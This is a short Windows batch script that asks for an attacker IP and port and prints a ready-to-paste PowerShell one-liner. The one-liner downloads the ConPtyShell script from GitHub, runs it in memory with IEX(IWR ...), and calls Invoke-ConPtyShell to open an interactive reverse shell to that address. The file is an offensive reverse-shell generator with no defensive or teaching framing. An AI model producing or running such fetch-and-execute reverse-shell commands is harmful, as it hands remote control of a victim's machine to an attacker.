@echo off
color b
type art.txt
set /P name="IP: "
set /P hi="PORT: "
cls
type art.txt
echo  IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell %name% %hi%
pause
exit